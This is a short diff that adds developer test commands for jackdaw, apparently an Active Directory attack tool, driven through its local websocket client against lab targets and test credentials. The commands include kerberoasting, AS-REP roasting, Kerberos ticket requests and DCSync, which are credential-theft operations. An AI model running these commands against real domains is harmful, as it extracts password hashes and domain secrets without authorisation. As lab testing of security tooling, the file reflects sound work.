@@ -1,0 +1,23 @@
+python3.8 -m jackdaw --sql sqlite:////home/devel/Desktop/test.db ws
+
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001'
+
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect listads listcreds listtargets creds targets "addcred test.corp test1 password secretpass" listcreds creds "addtarget 192.168.0.1" listtargets targets listgraphs listagents
+
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'addcred test.corp victim password Passw0rd!1' 'addtarget 10.10.10.2'
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'gather 1 1 1 1 1 1'
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'kerberoast 1 1 1 S-1-5-21-3448413973-1765323015-1500960949-1104'
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'asreproast 1 1 S-1-5-21-3448413973-1765323015-1500960949-1113'
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'gettgt 1 1 1'
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'gettgs 1 1 1' <<< fix this future me
+
+python3 -m jackdaw.nest.ws.client 'ws://127.0.0.1:5001' connect 'smbdcsync 14 1 1 S-1-5-21-3448413973-1765323015-1500960949-1118'
+
